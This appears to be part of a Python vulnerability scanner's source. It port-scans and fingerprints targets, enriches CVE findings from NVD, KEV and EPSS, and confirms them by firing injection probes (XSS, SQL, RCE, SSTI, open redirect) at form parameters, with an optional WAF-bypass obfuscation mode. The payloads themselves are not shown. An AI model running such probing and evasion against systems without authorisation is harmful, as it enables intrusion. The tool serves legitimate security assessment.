                    chunks.append(c)
                    if sum(len(x) for x in chunks) > 65536: break
                except socket.timeout:
                    break
            banner = b"".join(chunks)

        sock.close()
        return banner.decode("utf-8", errors="replace")[:8192] if banner else None
    except Exception:
        return None


def auto_banner_grab(host, port, timeout=3.0):
    use_ssl = port in SSL_PORTS
    b = banner_grab(host, port, timeout=timeout, use_ssl=use_ssl)
    if b: return b
    return banner_grab(host, port, timeout=timeout, use_ssl=not use_ssl)


def detect_working_url(candidates, timeout=10, insecure=True):
    session = HttpSession(insecure=insecure)
    for url in candidates:
        r = session.get(url, timeout=timeout, allow_redirects=True)
        if r is not None:
            return (url, r.status_code)
    return None


# ═══════════════════════════════════════════════════════════════════════
#  FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════════
TECH_SIGNATURES = {
    "Apache HTTP Server": {"vendor": "apache", "product": "http_server",
                            "header": (r"Server:\s*Apache/([\d.]+)", 1)},
    "nginx": {"vendor": "nginx", "product": "nginx",
              "header": (r"Server:\s*nginx/([\d.]+)", 1)},
    "Microsoft IIS": {"vendor": "microsoft",
                       "product": "internet_information_services",
                       "header": (r"Server:\s*Microsoft-IIS/([\d.]+)", 1)},
    "PHP": {"vendor": "php", "product": "php",
            "header": (r"X-Powered-By:\s*PHP/([\d.]+)", 1)},
    "ASP.NET": {"vendor": "microsoft", "product": "asp.net",
                 "header": (r"X-AspNet-Version:\s*([\d.]+)", 1)},
    "jQuery": {"vendor": "jquery", "product": "jquery",
                "html": [r"jquery[.-]([\d.]+)(?:\.min)?\.js"]},
    "Bootstrap": {"vendor": "getbootstrap", "product": "bootstrap",
                   "html": [r"bootstrap[./-]([\d.]+)(?:\.min)?\.(?:js|css)"]},
    "WordPress": {"vendor": "wordpress", "product": "wordpress",
                   "html": [r'<meta name="generator" content="WordPress ([\d.]+)']},
    "Drupal": {"vendor": "drupal", "product": "drupal",
                "html": [r'<meta name="Generator" content="Drupal ([\d.]+)']},
    "Joomla": {"vendor": "joomla", "product": "joomla",
                "html": [r'<meta name="generator" content="Joomla! ([\d.]+)']},
    "Tomcat": {"vendor": "apache", "product": "tomcat",
                "html": [r"Apache Tomcat/([\d.]+)"]},
    "Jenkins": {"vendor": "jenkins", "product": "jenkins",
                 "header": (r"X-Jenkins:\s*([\d.]+)", 1)},
    "GitLab": {"vendor": "gitlab", "product": "gitlab",
                "header": (r"X-Gitlab-Version:\s*([\d.]+)", 1)},
    "Grafana": {"vendor": "grafana", "product": "grafana",
                 "header": (r"X-Grafana-Version:\s*([\d.]+)", 1)},
    "Elasticsearch": {"vendor": "elastic", "product": "elasticsearch",
                       "html": [r'"number"\s*:\s*"([\d.]+)"']},
    "OpenSSL": {"vendor": "openssl", "product": "openssl",
                 "header": (r"OpenSSL/([\d.]+[a-z]?)", 1)},
}

BANNER_SIGNATURES = {
    "OpenSSH": {"vendor": "openbsd", "product": "openssh",
                 "patterns": [r"SSH-[\d.]+-OpenSSH_([\d.]+)"]},
    "vsFTPd": {"vendor": "vsftpd_project", "product": "vsftpd",
                "patterns": [r"vsFTPd\s+([\d.]+)"]},
    "ProFTPD": {"vendor": "proftpd", "product": "proftpd",
                 "patterns": [r"ProFTPD\s+([\d.]+)"]},
    "Exim": {"vendor": "exim", "product": "exim",
              "patterns": [r"Exim\s+([\d.]+)"]},
    "Postfix": {"vendor": "postfix", "product": "postfix",
                 "patterns": [r"Postfix\s+([\d.]+)"]},
    "MySQL": {"vendor": "oracle", "product": "mysql",
               "patterns": [r"([\d]+\.[\d]+\.[\d]+)-[\w.-]*MySQL"]},
    "MariaDB": {"vendor": "mariadb", "product": "mariadb",
                 "patterns": [r"5\.[\d.]+-MariaDB"]},
    "PostgreSQL": {"vendor": "postgresql", "product": "postgresql",
                    "patterns": [r"PostgreSQL\s+([\d.]+)"]},
    "Redis": {"vendor": "redis", "product": "redis",
               "patterns": [r"redis_version:([\d.]+)"]},
    "MongoDB": {"vendor": "mongodb", "product": "mongodb",
                 "patterns": [r'"version"\s*:\s*"([\d.]+)"']},
}


# ═══════════════════════════════════════════════════════════════════════
#  NVD / KEV / EPSS
# ═══════════════════════════════════════════════════════════════════════
NVD_API  = "https://services.nvd.nist.gov/rest/json/cves/2.0"
KEV_URL  = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
EPSS_API = "https://api.first.org/data/v1/epss"
CACHE_DIR = Path.home() / ".cache" / "cve_scanner"
CACHE_DIR.mkdir(parents=True, exist_ok=True)

_NVD_LOCK = threading.Lock()
_NVD_LAST = [0.0]
_NVD_RATE = 50.0 / 30.0 if NVD_API_KEY else 5.0 / 30.0


def _nvd_wait():
    with _NVD_LOCK:
        now = time.monotonic()
        gap = 1.0 / _NVD_RATE
        elapsed = now - _NVD_LAST[0]
        if elapsed < gap:
            time.sleep(gap - elapsed)
        _NVD_LAST[0] = time.monotonic()


def _load_cache(name, max_age=24):
    p = CACHE_DIR / f"{name}.json"
    if not p.exists(): return None
    if (time.time() - p.stat().st_mtime) / 3600 > max_age: return None
    try: return json.loads(p.read_text())
    except Exception: return None


def _save_cache(name, data):
    try: (CACHE_DIR / f"{name}.json").write_text(json.dumps(data))
    except Exception: pass


def fetch_kev():
    c = _load_cache("kev", 12)
    if c: return c
    try:
        data = http_get_json(KEV_URL)
        kev = {v["cveID"]: v for v in data.get("vulnerabilities", [])}
        _save_cache("kev", kev)
        return kev
    except Exception:
        return {}


def fetch_epss_batch(cve_ids):
    if not cve_ids: return {}
    out = {}
    for i in range(0, len(cve_ids), 50):
        chunk = cve_ids[i:i+50]
        try:
            data = http_get_json(EPSS_API, params={"cve": ",".join(chunk)})
            for item in data.get("data", []):
                out[item["cve"]] = float(item.get("epss", 0.0))
        except Exception:
            continue
    return out


def fetch_nvd_cve(cve_id, retry=0):
    _nvd_wait()
    headers = {}
    if NVD_API_KEY:
        headers["apiKey"] = NVD_API_KEY
    try:
        data = http_get_json(NVD_API, params={"cveId": cve_id}, headers=headers)
        vulns = data.get("vulnerabilities", [])
        return vulns[0]["cve"] if vulns else None
    except urllib.error.HTTPError as e:
        if e.code == 429 and retry < NVD_MAX_RETRIES:
            time.sleep(30 * (2 ** retry))
            return fetch_nvd_cve(cve_id, retry + 1)
        return None
    except Exception:
        if retry < NVD_MAX_RETRIES:
            time.sleep(2 ** retry)
            return fetch_nvd_cve(cve_id, retry + 1)
        return None


def fetch_nvd_cpe(vendor, product, version, retry=0):
    _nvd_wait()
    headers = {}
    if NVD_API_KEY:
        headers["apiKey"] = NVD_API_KEY
    params = {"cpeName": f"cpe:2.3:a:{vendor}:{product}:{version}:*:*:*:*:*:*:*",
              "resultsPerPage": 50}
    try:
        return http_get_json(NVD_API, params=params, headers=headers)
    except Exception:
        return {}


def extract_cvss(nvd):
    m = nvd.get("metrics", {})
    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV40", "cvssMetricV2"):
        if k in m and m[k]:
            try: return float(m[k][0]["cvssData"]["baseScore"])
            except (KeyError, TypeError, ValueError): pass
    return None


def extract_cwe(nvd):
    cwes = []
    for w in nvd.get("weaknesses", []):
        for d in w.get("description", []):
            v = d.get("value", "")
            if v.startswith("CWE-") and v not in cwes:
                cwes.append(v)
    return cwes


# ═══════════════════════════════════════════════════════════════════════
#  ENRICHMENT
# ═══════════════════════════════════════════════════════════════════════
def enrich_findings(findings):
    if not findings: return findings
    cve_ids = sorted({f["cve_id"] for f in findings if f.get("cve_id")})
    LOG.info(f"Enriching {len(findings)} findings ({len(cve_ids)} unique CVEs)...")
    epss_map = fetch_epss_batch(cve_ids)
    kev_map = fetch_kev()

    nvd_cache = {}
    if cve_ids:
        with ThreadPoolExecutor(max_workers=4) as ex:
            for cid, entry in zip(cve_ids, ex.map(fetch_nvd_cve, cve_ids)):
                nvd_cache[cid] = entry

    for f in findings:
        cid = f.get("cve_id")
        epss = epss_map.get(cid, 0.0) if cid else 0.0
        in_kev = bool(cid and cid in kev_map)
        cvss, nvd_cwe = None, []
        entry = nvd_cache.get(cid) if cid else None
        if entry:
            cvss = extract_cvss(entry)
            nvd_cwe = extract_cwe(entry)

        merged = sorted(set((f.get("cwe") or []) + nvd_cwe))

        if in_kev: priority = "CRITICAL"
        elif epss >= 0.1: priority = "HIGH"
        elif cvss is not None and cvss >= 7.0: priority = "HIGH"
        elif cvss is not None and cvss >= 4.0: priority = "MEDIUM"
        elif cid: priority = "LOW"
        else: priority = "INFO"

        f.update({"cwe": merged, "cvss": cvss, "epss": round(epss, 4),
                  "in_kev": in_kev, "priority": priority})
        status, reason = assess_fp(f)
        f["false_positive_status"] = status
        f["false_positive_reason"] = reason
    return findings


def assess_fp(finding):
    v = finding.get("verification")
    if v:
        s, fp = v.get("status"), v.get("fp_status")
        if s == "CONFIRMED":
            return ("CONFIRMED", v.get("evidence", "Active PoC confirmed"))
        if s == "WAF_BLOCKED":
            return ("UNVERIFIED", v.get("evidence", "Blocked by WAF"))
        if s == "NOT_REPRODUCED":
            return (fp or "LIKELY_FALSE_POSITIVE",
                    v.get("evidence", "PoC did not trigger"))

    if finding.get("source") in ("PortScan", "Banner", "HTTP"):
        return ("CONFIRMED", finding.get("summary", "Observed on target"))
    if finding.get("in_kev"):
        return ("CONFIRMED", "Listed in CISA KEV")
    cve = finding.get("cve_id")
    if not cve:
        return ("LIKELY_FALSE_POSITIVE", "No CVE assigned")
    epss = finding.get("epss", 0.0) or 0.0
    if epss >= 0.1:
        return ("LIKELY_REAL", f"High EPSS ({epss:.2%})")
    cvss = finding.get("cvss")
    if cvss is not None and cvss >= 7.0:
        return ("LIKELY_REAL", f"High CVSS ({cvss})")
    if cvss is not None:
        return ("NEEDS_REVIEW", f"CVE assigned, CVSS {cvss}")
    return ("NEEDS_REVIEW", "CVE assigned, no CVSS/EPSS")


# ═══════════════════════════════════════════════════════════════════════
#  INJECTION POINTS
# ═══════════════════════════════════════════════════════════════════════
FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
NAME_RE = re.compile(r'name=["\']([^"\']+)', re.I)
ACTION_RE = re.compile(r'action=["\']?([^"\'\s>]+)', re.I)
METHOD_RE = re.compile(r'method=["\']?([^"\'\s>]+)', re.I)


def extract_injection_points(html, base_url):
    seen, points = set(), []

    def add(url, method, params):
        key = (url, method, tuple(sorted(params)))
        if key in seen: return
        seen.add(key)
        points.append({"url": url, "method": method, "params": params})

    parsed = urllib.parse.urlparse(base_url)
    if parsed.query:
        add(base_url, "GET",
            list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys()))

    for fm in FORM_RE.finditer(html):
        outer, inner = fm.group(0), fm.group(1)
        a = ACTION_RE.search(outer)
        m = METHOD_RE.search(outer)
        action = urljoin(base_url, a.group(1)) if a else base_url
        method = (m.group(1) if m else "GET").upper()
        params = [n.group(1) for n in NAME_RE.finditer(inner)]
        if params:
            add(action, method, params)
    return points


# ═══════════════════════════════════════════════════════════════════════
#  RATE LIMITER
# ═══════════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, rate=0.0, jitter=0.0):
        self.rate, self.jitter, self._last = rate, jitter, 0.0

    def wait(self):
        if self.rate <= 0: return
        now = time.monotonic()
        gap = 1.0 / self.rate
        elapsed = now - self._last
        if elapsed < gap: time.sleep(gap - elapsed)
        if self.jitter > 0:
            import random
            time.sleep(self.jitter * (0.5 + 0.5 * random.random()))
        self._last = time.monotonic()


# ═══════════════════════════════════════════════════════════════════════
#  DETECTION
# ═══════════════════════════════════════════════════════════════════════
def is_blocked(resp):
    if resp is None: return False
    if resp.status_code in (403, 406, 429, 503): return True
    body = (resp.text or "").lower()
    for p in ("blocked by", "access denied", "request rejected",
              "firewall", "captcha", "challenge"):
        if p in body: return True
    return False


def detect_signal(exploit, baseline, payload, probe):
    if exploit is None or baseline is None:
        return False, "request failed"
    mode = probe["detect"]

    if mode == "xss_reflection":
        for marker in probe.get("markers", []):
            if marker in exploit.text and marker not in baseline.text:
                return True, f"marker {marker!r} reflected"
        hits = match_signatures(exploit.text, XSS_SIGNATURES, baseline.text)
        if hits: return True, f"XSS sigs: {hits}"
        return False, "no reflection"

    if mode == "sql":
        delta = exploit.elapsed_seconds - baseline.elapsed_seconds
        if delta >= probe.get("timing_threshold", 3.0):
            return True, f"timing delta {delta:.1f}s"
        hits = match_signatures(exploit.text, SQL_ERROR_SIGNATURES, baseline.text)
        if hits: return True, f"SQL errors: {hits}"
        return False, "no signal"

    if mode == "rce":
        delta = exploit.elapsed_seconds - baseline.elapsed_seconds
        if delta >= probe.get("timing_threshold", 3.0):
            return True, f"timing delta {delta:.1f}s"
        hits = match_signatures(exploit.text, RCE_SIGNATURES, baseline.text)
        if hits: return True, f"RCE sigs: {hits}"
        return False, "no signal"

    if mode == "pattern":
        hits = match_signatures(exploit.text, probe.get("signatures", {}),
                                baseline.text)
        if hits: return True, f"signatures: {hits}"
        if payload in exploit.text and payload not in baseline.text:
            return True, "payload reflected"
        enc = quote(payload, safe="")
        if enc and enc in exploit.text and enc not in baseline.text:
            return True, "payload reflected (encoded)"
        return False, "no signal"

    if mode == "ssti":
        expected = probe.get("expected", "")
        if expected and expected in exploit.text and expected not in baseline.text:
            return True, f"SSTI evaluated → {expected}"
        hits = match_signatures(exploit.text, SSTI_SIGNATURES, baseline.text)
        if hits: return True, f"SSTI sigs: {hits}"
        return False, "no signal"

    if mode == "redirect":
        loc = exploit.headers.get("Location", "")
        if probe.get("expected", "evil.example.com") in loc:
            return True, f"redirects to {loc}"
        hits = match_signatures(exploit.text, OPEN_REDIRECT_SIGNATURES,
                                baseline.text)
        if hits: return True, f"redirect sigs: {hits}"
        return False, "no redirect"
    return False, f"unknown mode {mode}"


# ═══════════════════════════════════════════════════════════════════════
#  VERIFICATION
# ═══════════════════════════════════════════════════════════════════════
def verify_with_cve(target_url, cve_id, session, limiter):
    cve_id = cve_id.upper()
    probe = CVE_PROBES.get(cve_id)
    if not probe: return None

    baseline = session.get(target_url, timeout=15, allow_redirects=False)
    if baseline is None:
        return {"status": "UNVERIFIED", "reason": "Cannot reach target"}

    waf_blocks = 0
    for p in probe["probes"]:
        url = urljoin(target_url, p.get("path", "/"))
        method = p.get("method", "GET")
        limiter.wait()
        exploit = session.request(
            method, url,
            data=p.get("data"),
            headers=p.get("headers"),
            json_body=p.get("json_body"),
        )
        if exploit is None: continue

        if is_blocked(exploit) and not is_blocked(baseline):
            if detect_waf(exploit.status_code, exploit.headers, exploit.text):
                waf_blocks += 1
                continue

        req_status = p.get("require_status")
        if req_status and exploit.status_code not in req_status:
            continue

        hits = match_signatures(exploit.text, p.get("sig", {}), baseline.text)
        if hits:
            return {
                "status": "CONFIRMED", "fp_status": "CONFIRMED",
                "method": f"{cve_id} {probe['label']}",
                "evidence": f"{url}: {hits}",
            }

    if waf_blocks:
        return {"status": "WAF_BLOCKED", "fp_status": "UNVERIFIED",
                "method": f"{cve_id} {probe['label']}",
                "evidence": f"{waf_blocks} request(s) blocked by WAF"}

    return {"status": "NOT_REPRODUCED", "fp_status": "NEEDS_REVIEW",
            "method": f"{cve_id} {probe['label']}",
            "evidence": f"Probes did not trigger ({len(probe['probes'])} endpoint(s))"}


def verify_with_cwe(target_url, cwe, session, limiter, waf_bypass):
    probe = CWE_PROBES.get(cwe)
    if not probe: return None

    page = session.get(target_url, timeout=15, allow_redirects=True)
    if page is None:
        return {"status": "UNVERIFIED", "reason": "Cannot fetch target"}

    points = extract_injection_points(page.text, target_url)
    if not points:
        return {"status": "UNVERIFIED", "reason": "No parameters found"}

    LOG.info(f"    {probe['label']}: {len(points)} point(s) × {len(probe['payloads'])} payload(s)")

    baselines = {}
    def baseline_of(pt):
        key = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
        if key not in baselines:
            limiter.wait()
            baselines[key] = session.request(
                pt["method"], pt["url"],
                data={p: "safe_test_123" for p in pt["params"]},
                allow_redirects=False,
            )
        return baselines[key]

    waf_blocks = 0
    for payload in probe["payloads"]:
        variants = obfuscate_payload(payload) if waf_bypass else [payload]
        for variant in variants:
            for pt in points:
                baseline = baseline_of(pt)
                limiter.wait()
                exploit = session.request(
                    pt["method"], pt["url"],
                    data={p: variant for p in pt["params"]},
                    allow_redirects=False,
                )

                if (exploit and is_blocked(exploit) and not is_blocked(baseline)):
                    if detect_waf(exploit.status_code, exploit.headers, exploit.text):
                        waf_blocks += 1
                        continue

                vuln, why = detect_signal(exploit, baseline, variant, probe)
                if vuln:
                    return {"status": "CONFIRMED", "fp_status": "CONFIRMED",
                            "method": f"{probe['label']} PoC",
                            "evidence": f"{pt['url']} ({pt['method']}, "
                                        f"params={pt['params']}): {why}"}

    if waf_blocks:
        return {"status": "WAF_BLOCKED", "fp_status": "UNVERIFIED",
                "method": f"{probe['label']} PoC",
                "evidence": f"{waf_blocks} request(s) blocked"}
    return {"status": "NOT_REPRODUCED", "fp_status": "LIKELY_FALSE_POSITIVE",
            "method": f"{probe['label']} PoC",
            "evidence": "Payloads did not trigger"}


def _best_attempt(attempts):
    if not attempts: return None
    def key(a):
        s, fp = a.get("status", ""), a.get("fp_status", "")
        if fp == "LIKELY_FALSE_POSITIVE": return 0
        if fp == "NEEDS_REVIEW": return 1
        if s == "WAF_BLOCKED": return 2
        if s == "NOT_REPRODUCED": return 3
        if s == "UNVERIFIED": return 4
        return 9
    return min(attempts, key=key)


def verify_findings(findings, target_url, session, limiter, waf_bypass=False,
                     skip_confirmed=False):
    LOG.info(f"Verifying {len(findings)} findings against {target_url}")

    probe = session.get(target_url, timeout=15, allow_redirects=True)
    if probe:
        waf = detect_waf(probe.status_code, probe.headers, probe.text)
        if waf:
            LOG.warn(f"WAF detected: {waf['vendor']}")

    for i, finding in enumerate(findings, 1):
        if not finding.get("cve_id") and not finding.get("cwe"):
            continue
        if skip_confirmed and finding.get("false_positive_status") == "CONFIRMED":
            continue

        cve = (finding.get("cve_id") or "").upper() or None
        cwe = (finding.get("cwe") or [None])[0]

        LOG.info(f"[{i}/{len(findings)}] {cve or finding.get('id')} "
                 f"(CWE: {cwe or 'N/A'})")

        attempts = []
        confirmed = None

        if cve and cve in CVE_PROBES:
            r = verify_with_cve(target_url, cve, session, limiter)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED": confirmed = r

        if not confirmed and cwe:
            r = verify_with_cwe(target_url, cwe, session, limiter, waf_bypass)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED": confirmed = r

        if confirmed:
            finding["verification"] = confirmed
            LOG.confirm(cve or cwe, confirmed["method"],
                        confirmed.get("evidence", ""))
        else:
            best = _best_attempt(attempts)
            if best:
                finding["verification"] = best
                LOG.info(f"    -> {best['status']}: "
                         f"{best.get('evidence', '')[:100]}")
            else:
                finding["verification"] = {"status": "UNVERIFIED",
                                            "reason": "No PoC available"}

        if attempts:
            finding["verification_attempts"] = [
                {"method": a.get("method"), "status": a.get("status"),
                 "fp_status": a.get("fp_status"),
                 "evidence": a.get("evidence", a.get("reason", ""))}
                for a in attempts
            ]

        time.sleep(0.5)

    for f in findings:
        s, r = assess_fp(f)
        f["false_positive_status"] = s
        f["false_positive_reason"] = r
    return findings


# ═══════════════════════════════════════════════════════════════════════
#  HTTP FINGERPRINTING + CPE LOOKUP
# ═══════════════════════════════════════════════════════════════════════
def fingerprint_http(target, session):
    r = session.get(target, timeout=20, allow_redirects=True)
    if r is None: return {}, []

    headers_text = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    body = r.text or ""

    detected = {}
    for name, sig in TECH_SIGNATURES.items():
        version = None
        hr = sig.get("header")
        if hr:
            pattern, group = hr
            m = re.search(pattern, headers_text, re.I)
            if m and m.lastindex:
                version = m.group(group)
        if not version:
            for pat in sig.get("html", []):
                m = re.search(pat, body, re.I)
                if m and m.lastindex:
                    version = m.group(1)
                    break
        if version:
            detected[name] = version

    findings = []
    for name, version in detected.items():
        sig = TECH_SIGNATURES[name]
        findings.extend(_cpe_lookup(sig["vendor"], sig["product"], version))

    return detected, findings


def fingerprint_banner(banner):
    if not banner: return {}, []
    detected = {}
    for name, sig in BANNER_SIGNATURES.items():
        for pat in sig.get("patterns", []):
            m = re.search(pat, banner, re.I)
            if m and m.lastindex:
                detected[name] = m.group(1)
                break

    findings = []
    for name, version in detected.items():
        sig = BANNER_SIGNATURES[name]
        findings.extend(_cpe_lookup(sig["vendor"], sig["product"], version))
    return detected, findings


def _cpe_lookup(vendor, product, version):
    data = fetch_nvd_cpe(vendor, product, version)
    if not data: return []

    findings = []
    for vuln in data.get("vulnerabilities", []):
        cve = vuln.get("cve", {})
        cve_id = cve.get("id")
        if not cve_id: continue

        matched = False
        for config in cve.get("configurations", []):
            for node in config.get("nodes", []):
                for m in node.get("cpeMatch", []):
                    if not m.get("vulnerable"): continue
                    criteria = m.get("criteria", "")
                    if f":{vendor}:{product}:" not in criteria: continue
                    si = m.get("versionStartIncluding")
                    se = m.get("versionStartExcluding")
                    ei = m.get("versionEndIncluding")
                    ee = m.get("versionEndExcluding")
                    if si or se or ei or ee:
                        if version_in_range(version, si, se, ei, ee):
                            matched = True
                    else:
                        parts = criteria.split(":")
                        if len(parts) > 5 and parts[4] == version:
                            matched = True
                    if matched: break
                if matched: break
            if matched: break

        if not matched: continue

        cvss = extract_cvss(cve)
        cwes = extract_cwe(cve)
        descs = cve.get("descriptions") or [{}]
        findings.append({
            "cve_id": cve_id, "package": product, "version": version,
            "ecosystem": "CPE", "cwe": cwes, "cvss": cvss,
            "summary": (descs[0] or {}).get("value", "")[:300],
            "source": "CPE", "in_kev": False, "epss": 0.0,
            "priority": "HIGH" if (cvss or 0) >= 7.0 else "MEDIUM",
            "false_positive_status": "NEEDS_REVIEW",
            "false_positive_reason": f"Detected {vendor}/{product} {version}",
        })
    return findings


# ═══════════════════════════════════════════════════════════════════════
#  FULL PIPELINE PER TARGET
# ═══════════════════════════════════════════════════════════════════════
def scan_target(target, session):
    LOG.target(f"SCAN: {target}")
    findings = []

    candidates = normalize_target(target)
    LOG.info(f"Candidates: {candidates}")

    working = detect_working_url(candidates, insecure=session.insecure)
    if working:
        url, status = working
        LOG.info(f"Working URL: {url} (HTTP {status})")
    else:
        url = None
        LOG.warn("No HTTP/HTTPS endpoint responded")

    host = extract_host(target)
    LOG.info(f"Host: {host}")

    # Port scan
    open_ports = {}
    if AUTO_PORT_SCAN:
        LOG.step("Port scan")
        ports = CUSTOM_PORTS if CUSTOM_PORTS else COMMON_PORTS
        open_ports = port_scan(host, ports, PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS)
        if open_ports:
            LOG.info(f"Open: {sorted(open_ports.keys())}")
            for port, svc in sorted(open_ports.items()):
                LOG.finding("INFO", f"port-{port}", f"{svc} open")
                findings.append({
                    "package": f"port-{port}", "version": "",
                    "ecosystem": "Network", "source": "PortScan",
                    "summary": f"Port {port} open ({svc})",
                    "port": port, "service": svc,
                    "cve_id": None, "cwe": [],
                    "false_positive_status": "CONFIRMED",
                    "false_positive_reason": "TCP connect succeeded",
                    "priority": "INFO",
                })
        else:
            LOG.info("No common ports open")

    # Banner grab
    if AUTO_BANNER_GRAB and open_ports:
        LOG.step("Banner grab")
        for port in open_ports:
            banner = auto_banner_grab(host, port)
            if not banner: continue
            LOG.info(f"Port {port}: {banner[:100]!r}")
            detected, fp_findings = fingerprint_banner(banner)
            for name, ver in detected.items():
                LOG.finding("INFO", name, f"{ver} on port {port}")
                findings.append({
                    "package": name.lower(), "version": ver,
                    "ecosystem": "Banner", "source": "Banner",
                    "summary": f"{name} {ver} on port {port}",
                    "port": port, "cve_id": None, "cwe": [],
                    "false_positive_status": "CONFIRMED",
                    "false_positive_reason": f"Version from banner on port {port}",
                    "priority": "INFO",
                })
            findings.extend(fp_findings)

    # HTTP fingerprint
    if url and AUTO_HTTP_FINGERPRINT:
        LOG.step("HTTP fingerprint")
        detected, fp_findings = fingerprint_http(url, session)
        for name, ver in detected.items():
            LOG.finding("INFO", name, f"{ver} via HTTP")
            findings.append({
                "package": name.lower(), "version": ver,
                "ecosystem": "HTTP", "source": "HTTP",
                "summary": f"{name} {ver} via HTTP headers",
                "cve_id": None, "cwe": [],
                "false_positive_status": "CONFIRMED",
                "false_positive_reason": "Version from HTTP response",
                "priority": "INFO",
            })
        findings.extend(fp_findings)

    # Dedupe
    seen, deduped = set(), []
    for f in findings:
        key = (f.get("cve_id"), f.get("package"), f.get("port"))
        if key in seen: continue
        seen.add(key)
        deduped.append(f)

    # Enrich
    if deduped:
        LOG.step("Enrichment")
        deduped = enrich_findings(deduped)

    # Probe
    if AUTO_PROBE and url:
        probe_targets = [f for f in deduped
                         if f.get("cve_id") or f.get("cwe")]
        if probe_targets:
            LOG.step(f"PoC verification ({len(probe_targets)} candidates)")
            limiter = RateLimiter(PROBE_RATE, PROBE_JITTER)
            deduped = verify_findings(
                deduped, url, session, limiter,
                waf_bypass=PROBE_WAF_BYPASS,
            )

    return deduped


# ═══════════════════════════════════════════════════════════════════════
#  REPORTING
# ═══════════════════════════════════════════════════════════════════════
def save_json(findings, path):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(findings, indent=2, ensure_ascii=False))
    LOG.info(f"JSON saved: {path}")


def save_html(findings, path):
    path.parent.mkdir(parents=True, exist_ok=True)
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4, "UNKNOWN": 5}
    rows = []
    for f in sorted(findings, key=lambda x: (order.get(x.get("priority"), 5),
                                              -(x.get("epss") or 0))):
        cve = f.get("cve_id") or f.get("id") or "—"
        cwes = f.get("cwe") or []
        cwe_name = cwe_friendly(cwes[0]) if cwes else "—"
        prio = f.get("priority", "UNKNOWN")
        fp = f.get("false_positive_status", "UNKNOWN")
        reason = (f.get("false_positive_reason") or "")[:200]
        color = {"CRITICAL": "#b71c1c", "HIGH": "#d84315",
                 "MEDIUM": "#f57f17", "LOW": "#2e7d32",
                 "INFO": "#1976d2"}.get(prio, "#555")
        fp_color = {"CONFIRMED": "#b71c1c", "LIKELY_REAL": "#d84315",
                    "NEEDS_REVIEW": "#f57f17",
                    "LIKELY_FALSE_POSITIVE": "#2e7d32",
                    "UNVERIFIED": "#555"}.get(fp, "#555")
        rows.append(
            f"<tr><td style='color:{color};font-weight:bold'>{prio}</td>"
            f"<td>{cve}<br><small>{cwe_name} {', '.join(cwes)}</small></td>"
            f"<td>{f.get('package','?')} <small>{f.get('version','')}</small></td>"
            f"<td>{f.get('cvss') or '-'}</td>"
            f"<td>{(f.get('epss') or 0):.2%}</td>"
            f"<td>{'Yes' if f.get('in_kev') else 'No'}</td>"
            f"<td style='color:{fp_color};font-weight:bold'>{fp}</td>"
            f"<td><small>{reason}</small></td></tr>"
        )
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Scan Report</title>
<style>
body{{font-family:system-ui,sans-serif;margin:20px;color:#222}}
h1{{border-bottom:2px solid #333;padding-bottom:8px}}
table{{border-collapse:collapse;width:100%;font-size:13px}}
th,td{{border:1px solid #ddd;padding:6px 8px;text-align:left;vertical-align:top}}
th{{background:#f4f4f4;position:sticky;top:0}}
tr:nth-child(even){{background:#fafafa}}
small{{color:#666}}.meta{{color:#666;margin-bottom:16px}}
</style></head><body>
<h1>Scan Report</h1>
<div class="meta">{time.strftime("%Y-%m-%d %H:%M:%S")} · {len(findings)} finding(s)</div>
<table><thead><tr>
<th>Priority</th><th>CVE / Type</th><th>Package</th><th>CVSS</th>
<th>EPSS</th><th>KEV</th><th>FP Status</th><th>Reason</th>
</tr></thead><tbody>{''.join(rows)}</tbody></table></body></html>"""
    path.write_text(html, encoding="utf-8")
    LOG.info(f"HTML saved: {path}")


def print_summary(findings):
    if not findings:
        LOG.info("No findings.")
        return
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: (order.get(f.get("priority"), 5),
                                 -(f.get("epss") or 0)))
    LOG._write("\n" + "─" * 88)
    LOG._write("SUMMARY")
    LOG._write("─" * 88)
    for f in findings:
        cve = f.get("cve_id") or f.get("id") or f.get("package", "?")
        LOG.finding(f.get("priority", "UNKNOWN"), cve,
                    (f.get("summary") or "")[:100])
        if f.get("false_positive_status") == "CONFIRMED":
            LOG.info(f"    ✓ {f.get('false_positive_reason', '')[:150]}")

    counts = Counter(f.get("false_positive_status") for f in findings)
    LOG._write("\n" + "─" * 88)
    for k in ("CONFIRMED", "LIKELY_REAL", "NEEDS_REVIEW",
              "LIKELY_FALSE_POSITIVE", "UNVERIFIED"):
        if counts.get(k):
            LOG._write(f"  {k:<22}: {counts[k]}")
    LOG._write(f"  {'TOTAL':<22}: {len(findings)}")
    LOG._write("─" * 88)


# ═══════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════
def main():
    global LOG
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    LOG = DualLogger(OUTPUT_DIR / f"scan-{timestamp}.log")

    LOG._write(f"\n{'═'*88}")
    LOG._write(f"  CVE Scanner — Standalone (pure Python)")
    LOG._write(f"  Targets: {len(TARGETS)}")
    LOG._write(f"  Output:  {OUTPUT_DIR.absolute()}")
    LOG._write(f"{'═'*88}")

    session = HttpSession(
        insecure=INSECURE,
        user_headers=AUTH_HEADERS,
        basic_auth=BASIC_AUTH,
        cookie=COOKIE,
    )

    all_findings = []

    for i, target in enumerate(TARGETS, 1):
        try:
            LOG._write(f"\n[{i}/{len(TARGETS)}] Scanning {target}")
            findings = scan_target(target, session)
            all_findings.extend(findings)
        except KeyboardInterrupt:
            LOG.warn("Interrupted")
            break
        except Exception as e:
            LOG.error(f"Target failed: {e}")
            continue

